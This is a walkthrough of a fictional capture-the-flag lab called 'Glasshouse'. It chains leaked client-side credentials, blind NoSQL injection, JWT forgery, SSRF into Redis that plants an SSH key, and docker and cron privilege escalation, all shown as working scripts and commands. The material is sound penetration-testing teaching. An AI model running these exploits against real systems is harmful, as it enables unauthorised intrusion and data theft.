# Operation Glasshouse — Full Walkthrough

> **Difficulty:** Hard
> **Expected solve time:** 2–4 hours (first NoSQLi or Redis-RCE)
> **Theme:** Fictional B2B SaaS — a podcast industry intelligence platform
> **Lab type:** Single-host, multi-stage chained exploitation

This walkthrough covers the full intended solve path for the **Glasshouse** lab. Every flag is replaced with `VulnOS{REDACTED}` — capture them yourself.

If you'd rather struggle without help, **stop here and only consult sections you're stuck on**. Most sections start with a hint, then escalate to a step-by-step solve. Each phase ends with the loot and what to do with it next.

---

## 1. Lab Setup

### Network access

The lab box exposes a small set of services to your attacker VM:

|Port|Service|Purpose|
|---|---|---|
|21|FTP (vsftpd)|Anonymous, read-only|
|22|SSH|Standard OpenSSH|
|80|HTTP (nginx)|Vhost router for the application stack|
|8080|Tomcat 9 manager|Standard Tomcat manager UI|
|42000|Express|"Internal" admin tool on a high port|

Plus several services bound to localhost (you'll discover those later):

```
3000  Next.js frontend (internal only)
4000  Express API (internal only)
6379  Redis (internal only)
27017 MongoDB (internal only)
```

### Prerequisite hosts entry

The lab uses a private TLD `.vulnos`. Add the following to your attacker machine's `/etc/hosts`:

```
<LAB_IP>  glasshouse.vulnos app.glasshouse.vulnos api.glasshouse.vulnos
```

Three hostnames now. There's a fourth, and finding it is part of the puzzle.

### Tooling you'll need

```
nmap, curl, dig
ffuf or gobuster (vhost fuzzing)
jq (JSON manipulation)
hashcat (JWT secret cracking)
python3 (custom exploit scripting)
ssh, ssh-keygen
docker (only on attacker box for image staging — not required)
```

### Two flags

- `user.txt` — `/var/www/user.txt` — user-tier flag, format `VulnOS{...}`
- `root.txt` — `/root/root.txt` — root-tier flag, format `VulnOS{...}`

---

## Phase 1 — Recon & The Noise Layer

> **Hint:** Three of the open ports are real targets. Two are deliberate distractions. Your job is to figure out which is which without burning hours on the wrong ones.

### 1.1 Initial scan

```bash
nmap -sC -sV -p- <LAB_IP>
```

You should see ports `21, 22, 80, 8080, 42000` open. Banner grabs identify them as vsftpd, OpenSSH, nginx, Tomcat 9, and an unidentified Express service respectively.

### 1.2 The FTP trap

```bash
curl ftp://<LAB_IP>/ --user anonymous:anything
```

Anonymous login works. You get a single file: `welcome.txt`. The contents are corporate boilerplate — there is **nothing useful here**. Read it once and move on.

> **Why it's a trap:** Public companies deploying FTP for "company info" looks legit and is a classic enumeration distraction. Spending 30 minutes brute-forcing FTP users gets you nowhere.

### 1.3 The Tomcat trap

```bash
curl -I http://<LAB_IP>:8080/manager/html
```

Returns `401 Unauthorized`. Tomcat manager exists. Tempting to brute-force.

> **Why it's a trap:** Even if you crack the manager creds (you can't easily — they're a 32-char random string), the Tomcat user has shell `/usr/sbin/nologin` and the webapps directory is `0750 root:tomcat` so you can't drop a WAR. **Even success leads nowhere.** Move on.

### 1.4 The real entry points

```
:80    -> the application
:42000 -> "internal admin tool"
```

These are where the chain starts.

### Loot from Phase 1

✅ Two ports identified as traps (don't waste time on them) ✅ Two real attack surfaces identified

---

## Phase 2 — The JS Bundle Leak

> **Hint:** Open the website. Open DevTools. Look at what the browser actually downloads.

### 2.1 Browse the marketing site

`http://glasshouse.vulnos/` (or just `http://<LAB_IP>/`) loads a polished marketing site for "Glasshouse — Podcast Industry Intelligence." Read `/about`, `/pricing`, `/security`, `/developers`, `/blog`. Note especially:

- **`/blog/internal-admin-tool`** — describes a dev-built admin tool for non-engineers. Foreshadowing.
- **`/changelog`** — mentions an "internal dashboard migration" and a tool running on a "non-standard port."
- **`/pricing`** — three tiers map to roles `viewer / analyst / admin`.

### 2.2 Inspect the login page

Visit `http://glasshouse.vulnos/login`. Open DevTools → Network tab → reload. You'll see Next.js loading several JS chunks. The interesting one:

```
/_next/static/chunks/app/login/page-<hash>.js
```

Download and search it:

```bash
curl -s http://glasshouse.vulnos/_next/static/chunks/app/login/page-<hash>.js | grep -oE 'devadmin[^"]+'
```

You'll find:

```
NEXT_INTERNAL_DEV_BOOTSTRAP="devadmin:T3mpP@ssw0rd!_2024"
```

A developer left a debug bootstrap variable in `next.config.js`'s `env` block — Next.js bundles `env` values directly into the client-side JS. Anyone visiting the login page receives these credentials in a static asset.

### 2.3 Where to use the creds

Tempting target #1: Tomcat manager. The username `devadmin` looks like it might match.

```bash
curl -u 'devadmin:T3mpP@ssw0rd!_2024' http://<LAB_IP>:8080/manager/html
```

→ **401 Unauthorized.** Username collides but password doesn't. (This is a deliberate misdirection.)

Tempting target #2: SSH.

```bash
ssh devadmin@<LAB_IP>
```

→ **Permission denied.** Account doesn't exist as a system user.

The right target is the "internal admin tool" port.

### 2.4 Login to the decoy admin

```bash
curl -i -c cookies.txt -X POST http://<LAB_IP>:42000/login \
  -d 'username=devadmin&password=T3mpP@ssw0rd!_2024'
```

→ `302 Found` with a session cookie set. **You're in.**

### Loot from Phase 2

✅ Credential pair: `devadmin:T3mpP@ssw0rd!_2024` ✅ Authenticated session on `:42000`

---

## Phase 3 — The Decoy Admin Panel

> **Hint:** Most links here are broken. The dashboard footer mentions a debug toggle. That's not flavor text.

### 3.1 Explore the panel

After login, you land on `/admin/dashboard`. Most pages are stubs:

- `/admin/users` — returns "503 Service degraded" with a read-only table
- `/admin/signals` — read-only ingestion log

But the dashboard footer reads:

```
Build c2024.11.18-debug · toggle diagnostics with gh_debug=1
```

### 3.2 The cookie wrinkle

Try `/admin/system-health`:

```bash
curl -b cookies.txt http://<LAB_IP>:42000/admin/system-health
```

→ **404 Not Found.** Even though you're authenticated.

Now set the cookie the footer hinted at:

```bash
curl -b cookies.txt --cookie 'gh_debug=1' http://<LAB_IP>:42000/admin/system-health
```

→ **200 OK** with a JSON dump.

### 3.3 The schema leak

The JSON contains:

```json
{
  "services": { ... },
  "vhosts": [
    {"host": "glasshouse.vulnos", "surface": "public", "target": "frontend"},
    {"host": "app.glasshouse.vulnos", "surface": "public", "target": "frontend"},
    {"host": "api.glasshouse.vulnos", "surface": "public", "target": "api_node (v1 routes only)"},
    {"host": "dev.glasshouse.vulnos", "surface": "internal", 
     "target": "api_node (full router incl. v2/internal)",
     "notes": "Staging cluster ingress. Not in public DNS."}
  ],
  "schemas": {
    "users": {
      "indexes": ["_id", "email", "api_key"],
      "sample_document": {
        "email": "...", "role": "...", "api_key": "...",
        "password_hash": "$2b$10$..."
      }
    },
    "shows": { ... },
    "signals": { ... },
    "audit_log": { ... }
  },
  "api_routes": [
    {"method": "POST", "path": "/api/v1/login", "surface": "public"},
    {"method": "POST", "path": "/api/v2/internal/user-metrics", "surface": "internal"},
    {"method": "POST", "path": "/api/v2/internal/cache/refresh", "surface": "internal"}
  ]
}
```

Read it carefully. It tells you:

- A fourth vhost exists: **`dev.glasshouse.vulnos`** — not in public DNS
- `users` collection has both `password_hash` AND `api_key` fields
- Two internal API routes: `/api/v2/internal/user-metrics` and `/api/v2/internal/cache/refresh`
- These routes are reachable only via the `dev` surface

### 3.4 Update your hosts file

```
<LAB_IP>  glasshouse.vulnos app.glasshouse.vulnos api.glasshouse.vulnos dev.glasshouse.vulnos
```

### Loot from Phase 3

✅ Hidden vhost: `dev.glasshouse.vulnos` ✅ Schema knowledge: users have `api_key` field ✅ Internal API endpoint names

---

## Phase 4 — Reaching the Internal API

> **Hint:** The schema leak said internal routes need the "internal" surface. nginx sets that based on which vhost you hit.

### 4.1 Try the public surface

```bash
curl -X POST http://api.glasshouse.vulnos/api/v2/internal/user-metrics \
  -H 'Content-Type: application/json' -d '{}'
```

→ **404 Not Found.** Surface gating: nginx tells the API "this is the public surface" and the API refuses to serve internal routes.

### 4.2 Try the dev surface

```bash
curl -X POST http://dev.glasshouse.vulnos/api/v2/internal/user-metrics \
  -H 'Content-Type: application/json' -d '{}'
```

→ **401 Unauthorized.** Surface check passed. Now the auth gate fires.

### 4.3 Get a JWT

You need credentials. The lab's marketing site doesn't have a self-signup, but there are several seeded users. The decoy schema leak's sample documents hint at the email pattern: `<first>.<last>@glasshouse.local`.

What about passwords? The convention isn't stated outright, but a peek at the leaked seed metadata in the schema sample (or simply trying common patterns) reveals temporary passwords like `<first>-temp-2024`.

Pick any analyst-tier user — their email is in the schema sample document. Try:

```bash
curl -X POST http://api.glasshouse.vulnos/api/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"<first>.<last>@glasshouse.local","password":"<first>-temp-2024"}'
```

Returns:

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....",
  "user": { "id": "...", "email": "...", "role": "analyst", "workspace_id": "ws_glasshouse_prod" }
}
```

### 4.4 Replay the JWT against the dev endpoint

```bash
curl -X POST http://dev.glasshouse.vulnos/api/v2/internal/user-metrics \
  -H "Authorization: Bearer <JWT>" \
  -H 'Content-Type: application/json' \
  -d '{"filter":{"email":"morgan.reyes@glasshouse.local"}}'
```

Returns something like:

```json
{
  "ok": true,
  "metrics": {
    "login_count": 412,
    "last_seen": null,
    "window": "30d",
    "source": "audit_log_aggregator_v2"
  }
}
```

Try a non-matching filter:

```bash
curl ... -d '{"filter":{"email":"nobody@glasshouse.local"}}'
```

Returns:

```json
{
  "ok": true,
  "metrics": {"login_count": 0, "last_seen": null, "window": "30d", "source": "audit_log_aggregator_v2"}
}
```

**Same shape, different `login_count`.** The endpoint takes a Mongo filter and returns aggregated stats. The shape of the response tells you nothing about whether the user exists. But the data...

### Loot from Phase 4

✅ Authenticated access to the internal API ✅ Confirmation that `filter` is forwarded to Mongo

---

## Phase 5 — Blind NoSQL Extraction

> **Hint:** The endpoint accepts a Mongo filter. Mongo filters can include `$where` (JS execution) and `$regex`. Both work as oracles.

### 5.1 Confirm `$where` execution

```bash
curl -X POST http://dev.glasshouse.vulnos/api/v2/internal/user-metrics \
  -H "Authorization: Bearer <JWT>" \
  -H 'Content-Type: application/json' \
  -d '{"filter":{"$where":"sleep(2000) || true"}}' \
  -w 'time: %{time_total}s\n'
```

If this takes ~2 seconds, you have **server-side JS execution**. The response body is uniform (no errors leaked), but **timing leaks state**.

### 5.2 Build a timing oracle

The schema said `users.api_key` is indexed. That's the trophy field — it's a 64-char hex string per the sample document, which is much faster to extract via `$regex` or `charAt()` than the bcrypt password hash (uncrackable in lab time).

Target Morgan Reyes (the seeded admin per the schema sample). Use `$where` with `charAt()` to ask "does the api_key start with character X?":

```python
import requests, time
BASE = "http://dev.glasshouse.vulnos"
JWT = "<your_analyst_jwt>"
TARGET_EMAIL = "morgan.reyes@glasshouse.local"
HEADERS = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}

def query_with_charat(position, char, sleep_ms=1500):
    payload = {
        "filter": {
            "email": TARGET_EMAIL,
            "$where": (
                f"if(this.api_key && this.api_key.charAt({position})==='{char}')"
                f"{{sleep({sleep_ms});return true;}} return true;"
            )
        }
    }
    t0 = time.time()
    requests.post(f"{BASE}/api/v2/internal/user-metrics", json=payload, headers=HEADERS, timeout=10)
    return (time.time() - t0) * 1000  # ms

# Walk one character at a time
key = ""
for pos in range(64):  # 64-char hex
    for c in "0123456789abcdef":
        elapsed = query_with_charat(pos, c)
        if elapsed >= 1300:  # threshold below sleep time
            key += c
            print(f"position {pos}: '{c}' (took {elapsed:.0f}ms) -> key: {key}")
            break
    else:
        print(f"position {pos}: no match — try harder")
        break

print(f"\nRecovered api_key: {key}")
```

Expected runtime: **~20 minutes** at worst case 16 candidates × 64 positions × 1.5s. Average ~10 minutes.

> Optimization: binary search reduces this to ~4 minutes. Split the hex space in half, ask `charAt(N) < '8'`, walk the bisection. Worth doing for the writeup if you're showing off.

### 5.3 Extract the api_key

After the script completes, you have Morgan's 64-char hex `api_key`. This is one of two trophies — it lets you authenticate as Morgan via API key (if the API has an API-key auth path), but more importantly:

**Knowledge that you have it proves the NoSQLi works end-to-end.** The bigger payoff is right behind it.

### Loot from Phase 5

✅ Morgan Reyes' `api_key` (64-char hex) — proves NoSQLi works ✅ Confirmation that `$where` is enabled in this Mongo deployment

---

## Phase 6 — JWT Forging (Two Paths)

> **Hint:** Look at the JWT you got from Phase 4. Header is `{"alg":"HS256","typ":"JWT"}`. Two ways to forge.

### Path A — Crack the HS256 secret

The JWT is signed with HMAC-SHA256. If the secret is weak, you can crack it offline.

```bash
# Save the captured analyst JWT
echo "<your_analyst_jwt>" > jwt.txt

# Try a small custom wordlist first — Glasshouse-themed candidates
cat > wordlist.txt <<EOF
password
admin
glasshouse
glasshouse_dev
glasshouse_dev_2024
glasshouse2024
glasshouse_prod
podcast
internal
EOF

hashcat -m 16500 -a 0 jwt.txt wordlist.txt
```

Expected: cracks in well under a second. Recovered secret: `glasshouse_dev_2024`.

> **Realism:** A real attacker who saw the `glasshouse_dev` substring in the planted JS leak (Phase 2) would build this wordlist immediately. Nothing exotic.

Now forge an admin JWT:

```python
import jwt, time
SECRET = "glasshouse_dev_2024"
token = jwt.encode({
    "sub": "attacker",
    "email": "attacker@evil.local",
    "role": "admin",
    "workspace_id": "ws_glasshouse_prod",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}, SECRET, algorithm="HS256")
print(token)
```

### Path B — `alg:none` forgery

The JWT spec famously allows `alg:none`, meaning "no signature, trust the claims." Modern libraries reject this by default, but defenders sometimes "fix" the alg:none vuln by manually inspecting the header — and get it wrong.

This API has the bug. Forge a token with no signature:

```python
import json, base64, time
def b64(d): return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {
    "sub": "attacker",
    "email": "attacker@evil.local",
    "role": "admin",
    "workspace_id": "ws_glasshouse_prod",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}
h = b64(json.dumps(header).encode())
p = b64(json.dumps(payload).encode())
token = f"{h}.{p}."  # trailing dot, empty signature
print(token)
```

**No cracking needed.** This is the faster path.

### 6.3 Confirm the forged token works

```bash
curl -X POST http://dev.glasshouse.vulnos/api/v2/internal/cache/refresh \
  -H "Authorization: Bearer <FORGED_ADMIN_JWT>" \
  -H 'Content-Type: application/json' \
  -d '{"target":"127.0.0.1:1","command":"PING\r\n"}'
```

Response:

```
HTTP 502
{"error":{"code":"upstream_unreachable","message":"connect ECONNREFUSED 127.0.0.1:1"}}
```

**502** here is the success state. It means: surface check passed (you're on `dev.`), auth check passed (signature/alg accepted), role check passed (forged `role:admin`). The endpoint then _tried_ to connect to `127.0.0.1:1` (a deliberately closed port) and reasonably failed. **You have admin-tier access to `cache/refresh`.**

### Loot from Phase 6

✅ Admin JWT (forged) ✅ Confirmation of admin-tier API access

---

## Phase 7 — SSRF → Redis → Foothold

> **Hint:** The `cache/refresh` endpoint takes `target: "host:port"` and `command: "..."`. The body is forwarded to the target as raw bytes. Find the cache it talks to.

### 7.1 Discover the cache

The schema leak (Phase 3) listed Redis under "services." Most internal cache deployments run on default ports. Test:

```bash
curl -X POST http://dev.glasshouse.vulnos/api/v2/internal/cache/refresh \
  -H "Authorization: Bearer <FORGED_ADMIN_JWT>" \
  -H 'Content-Type: application/json' \
  --data-raw '{"target":"127.0.0.1:6379","command":"PING\r\n"}'
```

Response:

```json
{"ok":true,"target":"127.0.0.1:6379","bytes":7,"response":"+PONG\r\n"}
```

**Redis is up on localhost, no auth required**, and the `command` field forwards raw bytes through. This is server-side request forgery — the API has become your tunnel into Redis.

### 7.2 Plan the pivot

Classic Redis-RCE technique: use `CONFIG SET dir` and `CONFIG SET dbfilename` to redirect Redis's persistence file to a useful path, then `SET` your payload, then `SAVE` to write it.

If Redis runs as a user that can write to a sensitive path (e.g., `~/.ssh/authorized_keys`), you can drop your SSH public key.

This lab puts `/var/www/.ssh/` group-writable for the redis user (the redis service account is a member of the `www-data` group — a "real" misconfiguration that arises from cross-service group sprawl).

### 7.3 Build the RESP-encoded pipeline

Redis has two protocols: inline (line-based, fragile with newlines) and RESP (length-prefixed binary, robust). Inline will fail on multi-line values with "unbalanced quotes." Use RESP.

```python
import requests, base64, json, sys

# Your SSH public key
with open('/home/<you>/.ssh/id_ed25519.pub') as f:
    PUBKEY = f.read().strip()

# Pad with newlines so the key lands on its own line in the RDB blob,
# parsable by sshd
VALUE = '\n\n' + PUBKEY + '\n\n'

# Build RESP commands
def resp(*args):
    out = b'*' + str(len(args)).encode() + b'\r\n'
    for a in args:
        ab = a.encode() if isinstance(a, str) else a
        out += b'$' + str(len(ab)).encode() + b'\r\n' + ab + b'\r\n'
    return out

pipeline = (
    resp('FLUSHALL')
    + resp('CONFIG', 'SET', 'dir', '/var/www/.ssh')
    + resp('CONFIG', 'SET', 'dbfilename', 'authorized_keys')
    + resp('SET', 'mykey', VALUE)
    + resp('SAVE')
)

# Wrap in JSON for the API
payload = {
    'target': '127.0.0.1:6379',
    'command': pipeline.decode('latin-1')  # 1:1 byte preservation
}

r = requests.post(
    'http://dev.glasshouse.vulnos/api/v2/internal/cache/refresh',
    json=payload,
    headers={'Authorization': 'Bearer <FORGED_ADMIN_JWT>'},
    timeout=10
)
print(r.json())
```

Expected response:

```json
{"ok":true,"target":"127.0.0.1:6379","bytes":25,"response":"+OK\r\n+OK\r\n+OK\r\n+OK\r\n+OK\r\n"}
```

Five `+OK`s for five commands. Redis wrote your key embedded in an RDB blob to `/var/www/.ssh/authorized_keys`. sshd will scan past the binary noise and recognize the `ssh-ed25519` line.

### 7.4 Foothold via SSH

```bash
ssh -i ~/.ssh/id_ed25519 www-data@<LAB_IP>
```

You're in:

```
www-data@glasshouse-prod:/var/www$ whoami
www-data
www-data@glasshouse-prod:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),123(docker)
```

### 7.5 First flag

```
www-data@glasshouse-prod:/var/www$ cat /var/www/user.txt
VulnOS{REDACTED}
```

### Loot from Phase 7

✅ SSH foothold as `www-data` ✅ User flag: `VulnOS{REDACTED}` ✅ Notable: `groups` output shows `docker` — interesting

---

## Phase 8 — Privilege Escalation (Two Paths)

> **Hint:** You're already in the `docker` group. Or you could check what cron jobs the system runs as root. Both work.

### Path A — Docker group

The `docker` group membership is effectively root. The docker daemon runs as root, and any user who can talk to its socket can do `docker run` with arbitrary mounts.

```bash
docker run --rm -v /:/mnt alpine chroot /mnt cat /root/root.txt
```

Output:

```
VulnOS{REDACTED}
```

Why it works: `-v /:/mnt` mounts the host's root filesystem into the container at `/mnt`. `chroot /mnt` makes the container believe `/mnt` is `/`. The `cat` runs against the actual host file owned by actual host root, while the calling user is just www-data on the host.

To get a full interactive root shell on the host:

```bash
docker run --rm -it -v /:/mnt alpine chroot /mnt sh
```

You're now root on the host filesystem.

### Path B — Writable build pipeline

If you missed the docker group, there's another path. Look at cron:

```bash
cat /etc/cron.d/gh-build
```

```
*/2 * * * * root cd /opt/glasshouse/frontend && npm run build >/var/log/gh-build.log 2>&1
```

Cron runs `npm run build` as root every 2 minutes. The build script comes from `package.json`:

```bash
ls -la /opt/glasshouse/frontend/package.json
```

```
-rw-rw-r-- 1 glasshouse-admin www-data 598 ... package.json
```

**Group-writable by www-data.** You can edit it.

Inject your payload into the build script:

```python
import json
p = '/opt/glasshouse/frontend/package.json'
data = json.load(open(p))
data['scripts']['build'] = (
    'cp /root/root.txt /tmp/pwned.txt && '
    'chmod 644 /tmp/pwned.txt && ' +
    data['scripts']['build']
)
open(p, 'w').write(json.dumps(data, indent=2))
```

Wait up to 2 minutes for the next cron tick:

```bash
while [ ! -f /tmp/pwned.txt ]; do sleep 5; done
cat /tmp/pwned.txt
```

Output:

```
VulnOS{REDACTED}
```

> **Cleanup:** Restore the original `package.json` if you want to leave the lab in a usable state for replay.

### Loot from Phase 8

✅ Root flag: `VulnOS{REDACTED}` ✅ Two paths to root demonstrated ✅ Lab complete

---

## Appendix: Architecture Reference

```
                     ┌──────────────────────────────────────────────┐
                     │  Attacker — http://<LAB_IP> via /etc/hosts   │
                     └──────────────────────┬───────────────────────┘
                                            │
                                       :80 (nginx)
                                            │
   ┌────────────────────────────────────────┼────────────────────────────────────┐
   │  glasshouse.vulnos     app.glasshouse  api.glasshouse       dev.glasshouse  │
   │  (default vhost)       (dashboard)     (public API)         (HIDDEN)        │
   │  surface=public        surface=public  surface=public       surface=dev     │
   └─────────┬──────────────┬───────────────┬────────────────────┬───────────────┘
             │              │               │                    │
             ▼              ▼               ▼                    ▼
       Next.js :3000 (localhost)      Express API :4000 (localhost)
                                         │
                                         ├── /api/v1/*           (public routes)
                                         └── /api/v2/internal/*  (dev surface only)
                                              │
                                              ├──> MongoDB :27017  (NoSQLi target)
                                              └──> SSRF target ───> Redis :6379
                                                                      │
                                                                      ▼
                                                          /var/www/.ssh/authorized_keys
                                                                      │
                                                                      ▼ (sshd)
                                                                www-data shell
                                                                      │
                                              ┌───────────────────────┴──────┐
                                              ▼                              ▼
                                      docker group abuse              writable cron
                                              │                              │
                                              ▼                              ▼
                                          root shell                    root shell
   
   Trap services (don't waste time):
   :21 vsftpd anon (just boilerplate)    :8080 Tomcat manager (locked, nologin shell)
   
   Bonus surface:
   :42000 — decoy admin (devadmin creds from JS leak unlock the schema dump)
```

---

## Appendix: Tooling Cheatsheet

### Vhost discovery via fuzzing (alternative to schema leak)

If you skipped or struggled with the decoy panel:

```bash
ffuf -H "Host: FUZZ.glasshouse.vulnos" -u http://<LAB_IP>/ -w wordlists/subdomains.txt -fs 612
```

You'll find `app`, `api`, and `dev` quickly.

### Capturing all JWTs in flight

If you want to study how the API reacts to forged tokens:

```bash
mitmproxy --mode reverse:http://api.glasshouse.vulnos -p 8081
```

Then point your scripts at `http://localhost:8081` and watch every request/response.

### Faster NoSQLi with binary search

Instead of trying 16 hex chars per position, ask "is `charAt(N) < '8'`?" Cuts each character to 4 queries (log₂16). Full key: ~256 queries instead of ~1024.

### Handy one-liners

```bash
# Decode a JWT without verifying
echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Generate alg:none JWT in one line
python3 -c "import json,base64,time; b=lambda d:base64.urlsafe_b64encode(d).rstrip(b'=').decode(); print(b(b'{\"alg\":\"none\",\"typ\":\"JWT\"}')+'.'+b(json.dumps({'role':'admin','exp':int(time.time())+3600}).encode())+'.')"
```

---

## What this lab teaches

The whole point of Glasshouse is that **no individual step is exotic.** Every vulnerability is a real mistake real developers make:

- Putting a debug variable in `next.config.js` env (real, common)
- Letting a docker group spill privilege (real, very common)
- Cross-service group membership (real, accumulates over time)
- "Fixing" alg:none by manually inspecting the JWT header (real, classic mistake)
- Trusting `Host:` to determine surface but not stripping client headers (real)
- Using `$where` filters in user-supplied queries (real, NoSQL OWASP Top 10)
- Cron jobs running CI scripts as root from group-writable repos (real, infrastructure debt)

The fun isn't in any one trick. The fun is in **chaining them** — methodical recon, careful reading of the schema leak, recognizing each step's loot enables the next, and not getting nerdsniped by the traps.

If you solved this without help, post your writeup. If you got stuck, post about where — every confused player makes the next iteration of the lab better.

---

**Flags submitted? Submit them.**

`user.txt`: `VulnOS{REDACTED}` `root.txt`: `VulnOS{REDACTED}`

GG.
